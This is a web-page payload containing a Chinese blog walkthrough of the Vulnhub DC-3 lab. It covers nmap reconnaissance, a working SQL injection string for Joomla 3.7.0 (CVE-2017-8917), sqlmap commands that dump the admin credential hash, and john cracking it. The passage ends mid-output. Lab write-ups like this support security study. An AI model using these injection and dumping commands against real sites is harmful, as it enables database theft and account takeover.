{"pageProps":{"postData":{"id":"VulnhubDC-3","contentHtml":"<h1>DC-3</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-32,312/\">https://www.vulnhub.com/entry/dc-32,312/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>158</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-29 13:33 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00034</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00034</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.158</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00021</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">48</span>:D8:<span class=\"hljs-number\">1</span>E (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00043</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:E7:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.158</span>  \nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-29 13:34 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.158</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00089</span>s latency).\nNot shown: <span class=\"hljs-number\">65534</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">48</span>:D8:<span class=\"hljs-number\">1</span>E (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p80 <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.158</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-29 13:37 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.158</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00084</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">18</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">48</span>:D8:<span class=\"hljs-number\">1</span>E (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-sql\">nmap <span class=\"hljs-operator\">-</span>script<span class=\"hljs-operator\">=</span>vuln <span class=\"hljs-operator\">-</span>p <span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.158</span> \nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>nmap.org ) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-29</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">37</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.158</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00020</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  http\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>internal<span class=\"hljs-operator\">-</span>ip<span class=\"hljs-operator\">-</span>disclosure: \n<span class=\"hljs-operator\">|</span>_  Internal IP Leaked: <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.1</span>\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>dombased<span class=\"hljs-operator\">-</span>xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'</span>s resources causing Denial <span class=\"hljs-keyword\">Of</span> Service.\n<span class=\"hljs-operator\">|</span>       \n<span class=\"hljs-operator\">|</span>     Disclosure <span class=\"hljs-type\">date</span>: <span class=\"hljs-number\">2009</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-17</span>\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-keyword\">References</span>:\n<span class=\"hljs-operator\">|</span>       https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>cve.mitre.org<span class=\"hljs-operator\">/</span>cgi<span class=\"hljs-operator\">-</span>bin<span class=\"hljs-operator\">/</span>cvename.cgi?name<span class=\"hljs-operator\">=</span>CVE<span class=\"hljs-number\">-2007</span><span class=\"hljs-number\">-6750</span>\n<span class=\"hljs-operator\">|</span>_      http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>ha.ckers.org<span class=\"hljs-operator\">/</span>slowloris<span class=\"hljs-operator\">/</span>\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>enum: \n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>administrator<span class=\"hljs-operator\">/</span>: Possible admin folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>administrator<span class=\"hljs-operator\">/</span>index.php: Possible admin folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>administrator<span class=\"hljs-operator\">/</span>manifests<span class=\"hljs-operator\">/</span>files<span class=\"hljs-operator\">/</span>joomla.xml: Joomla version <span class=\"hljs-number\">3.7</span><span class=\"hljs-number\">.0</span>\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">language</span><span class=\"hljs-operator\">/</span>en<span class=\"hljs-operator\">-</span>GB<span class=\"hljs-operator\">/</span>en<span class=\"hljs-operator\">-</span>GB.xml: Joomla version <span class=\"hljs-number\">3.7</span><span class=\"hljs-number\">.0</span>\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>htaccess.txt: Joomla<span class=\"hljs-operator\">!</span>\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>README.txt: Interesting, a readme.\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>cache<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>images<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>includes<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>libraries<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>modules<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>templates<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span>_  <span class=\"hljs-operator\">/</span>tmp<span class=\"hljs-operator\">/</span>: Potentially interesting folder\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>vuln<span class=\"hljs-operator\">-</span>cve2017<span class=\"hljs-number\">-8917</span>: \n<span class=\"hljs-operator\">|</span>   VULNERABLE:\n<span class=\"hljs-operator\">|</span>   Joomla<span class=\"hljs-operator\">!</span> <span class=\"hljs-number\">3.7</span><span class=\"hljs-number\">.0</span> <span class=\"hljs-string\">'com_fields'</span> <span class=\"hljs-keyword\">SQL</span> Injection Vulnerability\n<span class=\"hljs-operator\">|</span>     State: VULNERABLE\n<span class=\"hljs-operator\">|</span>     IDs:  CVE:CVE<span class=\"hljs-number\">-2017</span><span class=\"hljs-number\">-8917</span>\n<span class=\"hljs-operator\">|</span>     Risk factor: High  CVSSv3: <span class=\"hljs-number\">9.8</span> (CRITICAL) (CVSS:<span class=\"hljs-number\">3.0</span><span class=\"hljs-operator\">/</span>AV:N<span class=\"hljs-operator\">/</span>AC:L<span class=\"hljs-operator\">/</span>PR:N<span class=\"hljs-operator\">/</span>UI:N<span class=\"hljs-operator\">/</span>S:U<span class=\"hljs-operator\">/</span>C:H<span class=\"hljs-operator\">/</span>I:H<span class=\"hljs-operator\">/</span>A:H)\n<span class=\"hljs-operator\">|</span>       An <span class=\"hljs-keyword\">SQL</span> injection vulnerability <span class=\"hljs-keyword\">in</span> Joomla<span class=\"hljs-operator\">!</span> <span class=\"hljs-number\">3.7</span>.x before <span class=\"hljs-number\">3.7</span><span class=\"hljs-number\">.1</span> allows attackers\n<span class=\"hljs-operator\">|</span>       <span class=\"hljs-keyword\">to</span> <span class=\"hljs-keyword\">execute</span> aribitrary <span class=\"hljs-keyword\">SQL</span> commands via unspecified vectors.\n<span class=\"hljs-operator\">|</span>       \n<span class=\"hljs-operator\">|</span>     Disclosure <span class=\"hljs-type\">date</span>: <span class=\"hljs-number\">2017</span><span class=\"hljs-number\">-05</span><span class=\"hljs-number\">-17</span>\n<span class=\"hljs-operator\">|</span>     Extra information:\n<span class=\"hljs-operator\">|</span>       <span class=\"hljs-keyword\">User</span>: root<span class=\"hljs-variable\">@localhost</span>\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-keyword\">References</span>:\n<span class=\"hljs-operator\">|</span>       https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>blog.sucuri.net<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">2017</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">05</span><span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">sql</span><span class=\"hljs-operator\">-</span>injection<span class=\"hljs-operator\">-</span>vulnerability<span class=\"hljs-operator\">-</span>joomla<span class=\"hljs-number\">-3</span><span class=\"hljs-number\">-7.</span>html\n<span class=\"hljs-operator\">|</span>_      https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>cve.mitre.org<span class=\"hljs-operator\">/</span>cgi<span class=\"hljs-operator\">-</span>bin<span class=\"hljs-operator\">/</span>cvename.cgi?name<span class=\"hljs-operator\">=</span>CVE<span class=\"hljs-number\">-2017</span><span class=\"hljs-number\">-8917</span>\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>stored<span class=\"hljs-operator\">-</span>xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.158\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.75.158:80/\n|     Form id: login-form\n|     Form action: /index.php\n|     \n|     Path: http://192.168.75.158:80/index.php/2-uncategorised/1-welcome\n|     Form id: login-form\n|     Form action: /index.php\n|     \n|     Path: http://192.168.75.158:80/index.php/component/users/?view=remind&#x26;amp;Itemid=101\n|     Form id: user-registration\n|     Form action: /index.php/component/users/?task=remind.remind&#x26;Itemid=101\n|     \n|     Path: http://192.168.75.158:80/index.php/component/users/?view=remind&#x26;amp;Itemid=101\n|     Form id: login-form\n|     Form action: /index.php/component/users/?Itemid=101\n|     \n|     Path: http://192.168.75.158:80/index.php/component/users/?view=reset&#x26;amp;Itemid=101\n|     Form id: user-registration\n|     Form action: /index.php/component/users/?task=reset.request&#x26;Itemid=101\n|     \n|     Path: http://192.168.75.158:80/index.php/component/users/?view=reset&#x26;amp;Itemid=101\n|     Form id: login-form\n|     Form action: /index.php/component/users/?Itemid=101\n|     \n|     Path: http://192.168.75.158:80/index.php\n|     Form id: login-form\n|     Form action: /index.php\n|     \n|     Path: http://192.168.75.158:80/index.php/2-uncategorised/\n|     Form id: login-form\n|_    Form action: /index.php\nMAC Address: 00:0C:29:48:D8:1E (VMware)\n\n</span></code></pre>\n<p>疑似<code>CSRF</code> ，并且扫描出CMS是<code>Joomla</code> ，并且扫出漏洞</p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>只开放一个80端口，访问主页，识别网站指纹</p>\n<p>CMS是<code>Joomla</code> ，系统是<code>Ubuntu</code> ，<code>PHP</code></p>\n<p><img src=\"/post-images/VulnhubDC-3/image25.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p><code>/administrator/manifests/files/joomla.xml</code> 可以找到<code>Joomla</code>版本是<code>3.7.0</code> ,下面还爆出了网站目录</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-operator\">&#x3C;</span>fileset<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>files<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>administrator<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span> <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 管理后台\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>bin<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>cache<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>cli<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>components<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>images<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>includes<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span><span class=\"hljs-keyword\">language</span><span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>layouts<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>libraries<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>media<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>modules<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>plugins<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>templates<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>folder<span class=\"hljs-operator\">></span>tmp<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>folder<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>file<span class=\"hljs-operator\">></span>htaccess.txt<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>file<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>file<span class=\"hljs-operator\">></span>web.config.txt<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>file<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>file<span class=\"hljs-operator\">></span>LICENSE.txt<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>file<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>file<span class=\"hljs-operator\">></span>README.txt<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>file<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span>file<span class=\"hljs-operator\">></span>index.php<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>file<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>files<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">&#x3C;</span><span class=\"hljs-operator\">/</span>fileset<span class=\"hljs-operator\">></span>\n</code></pre>\n</li>\n<li>\n<p>在<code>nmap</code>漏洞扫描可以看到，<code>Joomla</code> 被扫出了SQL注入漏洞，<code>CVE-2017-8917</code> ，利用该漏洞</p>\n<blockquote>\n<p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-8917\">https://nvd.nist.gov/vuln/detail/CVE-2017-8917</a> | <a href=\"https://blog.csdn.net/qq_51577576/article/details/129470364\">https://blog.csdn.net/qq_51577576/article/details/129470364</a></p>\n</blockquote>\n<p>通过漏洞手动注入寻找信息</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 构造链接\nindex.php?option<span class=\"hljs-operator\">=</span>com_fields<span class=\"hljs-operator\">&#x26;</span><span class=\"hljs-keyword\">view</span><span class=\"hljs-operator\">=</span>fields<span class=\"hljs-operator\">&#x26;</span>layout<span class=\"hljs-operator\">=</span>modal<span class=\"hljs-operator\">&#x26;</span>list[fullordering]<span class=\"hljs-operator\">=</span>updatexml(<span class=\"hljs-number\">0x23</span>,concat(<span class=\"hljs-number\">1</span>,<span class=\"hljs-keyword\">user</span>()),<span class=\"hljs-number\">1</span>)\n</code></pre>\n<pre><code class=\"hljs language-sql\"># 用户\n<span class=\"hljs-string\">'root@localhost'</span> \n# 当前库\njoomladb\n# 版本\n<span class=\"hljs-number\">25</span><span class=\"hljs-number\">-0</span>ubuntu0<span class=\"hljs-number\">.16</span><span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.2</span>\n# 尝试查找库当前表\n<span class=\"hljs-string\">'#__assets,#__associations,'</span> \n</code></pre>\n<p>丢给<code>sqlmap</code>操作</p>\n<pre><code class=\"hljs language-sql\">sqlmap <span class=\"hljs-operator\">-</span>u <span class=\"hljs-string\">'http://192.168.75.158/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml(0x23,concat(1,*),1)'</span> <span class=\"hljs-comment\">--dbs </span>\n[<span class=\"hljs-operator\">*</span>] information_schema\n[<span class=\"hljs-operator\">*</span>] joomladb\n[<span class=\"hljs-operator\">*</span>] mysql\n[<span class=\"hljs-operator\">*</span>] performance_schema\n[<span class=\"hljs-operator\">*</span>] sys\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nsqlmap <span class=\"hljs-operator\">-</span>u <span class=\"hljs-string\">'http://192.168.75.158/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml(0x23,concat(1,*),1)'</span> <span class=\"hljs-operator\">-</span>D joomladb <span class=\"hljs-comment\">--tables</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------------------------+</span>\n<span class=\"hljs-operator\">|</span> #__assets                  <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__associations            <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__banner_clients          <span class=\"hljs-operator\">|</span>\n\t\t    <span class=\"hljs-operator\">&#x3C;</span>省略<span class=\"hljs-operator\">></span>\n<span class=\"hljs-operator\">|</span> #__update_sites            <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__updates                 <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__user_keys               <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__user_notes              <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__user_profiles           <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__user_usergroup_map      <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__usergroups              <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__users                   <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__utf8_conversion         <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> #__viewlevels              <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------------------------+ // 刚刚手动就只能爆出前两个</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 这里开始就要设置参数了\n</code></pre>\n<p>扫描出<code>#__users</code> 表但是默认设置是爆不出列的，扫描字段的时候需要爆破，使用默认的字典就行</p>\n<pre><code class=\"hljs language-sql\">sqlmap <span class=\"hljs-operator\">-</span>u \"http://192.168.75.158/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml\" <span class=\"hljs-operator\">-</span>D joomladb <span class=\"hljs-operator\">-</span>T <span class=\"hljs-string\">'#__users'</span> <span class=\"hljs-comment\">--columns</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>                                                                                                                           \nDatabase: joomladb\n<span class=\"hljs-keyword\">Table</span>: #__users\n[<span class=\"hljs-number\">6</span> columns]\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+-------------+</span>\n<span class=\"hljs-operator\">|</span> <span class=\"hljs-keyword\">Column</span>   <span class=\"hljs-operator\">|</span> Type        <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+-------------+</span>\n<span class=\"hljs-operator\">|</span> name     <span class=\"hljs-operator\">|</span> non<span class=\"hljs-operator\">-</span><span class=\"hljs-type\">numeric</span> <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> email    <span class=\"hljs-operator\">|</span> non<span class=\"hljs-operator\">-</span><span class=\"hljs-type\">numeric</span> <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> id       <span class=\"hljs-operator\">|</span> <span class=\"hljs-type\">numeric</span>     <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> params   <span class=\"hljs-operator\">|</span> non<span class=\"hljs-operator\">-</span><span class=\"hljs-type\">numeric</span> <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> password <span class=\"hljs-operator\">|</span> non<span class=\"hljs-operator\">-</span><span class=\"hljs-type\">numeric</span> <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">|</span> username <span class=\"hljs-operator\">|</span> non<span class=\"hljs-operator\">-</span><span class=\"hljs-type\">numeric</span> <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+-------------+</span>\n</code></pre>\n<p>爆出六个字段，其中有我最喜欢的<code>password</code>和<code>username</code></p>\n<pre><code class=\"hljs language-sql\">sqlmap <span class=\"hljs-operator\">-</span>u \"http://192.168.75.158/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml\" <span class=\"hljs-operator\">-</span>D joomladb <span class=\"hljs-operator\">-</span>T <span class=\"hljs-string\">'#__users'</span> <span class=\"hljs-operator\">-</span>C username,password <span class=\"hljs-comment\">--dump</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+--------------------------------------------------------------+</span>\n<span class=\"hljs-operator\">|</span> username <span class=\"hljs-operator\">|</span> password                                                     <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+--------------------------------------------------------------+</span>\n<span class=\"hljs-operator\">|</span> admin    <span class=\"hljs-operator\">|</span> $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span>$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+--------------------------------------------------------------+</span>\n</code></pre>\n<p>放去<code>john</code>进行爆破，得出密码<code>snoopy</code></p>\n<pre><code class=\"hljs language-sql\">john pass    \n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>                                           \n<span class=\"hljs-keyword\">Using</span> <span class=\"hljs-keyword\">default</span> input encoding: UTF<span class=\"hljs-number\">-8</span>\nLoaded <span class=\"hljs-number\">1</span> password hash (bcrypt [Blowfish <span class=\"hljs-number\">32</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">64</span> X3])\nCost <span class=\"hljs-number\">1</span> (iteration count) <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">1024</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">all</span> loaded hashes\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nProceeding <span class=\"hljs-keyword\">with</span> single, rules:Single\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl<span class=\"hljs-operator\">-</span>C <span class=\"hljs-keyword\">to</span> abort, almost <span class=\"hljs-keyword\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nProceeding <span class=\"hljs-keyword\">with</span> wordlist:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>share<span class=\"hljs-operator\">/</span>john<span class=\"hljs-operator\">/</span>password.lst\nsnoopy           (?)     \n<span class=\"hljs-number\">1</span>g <span 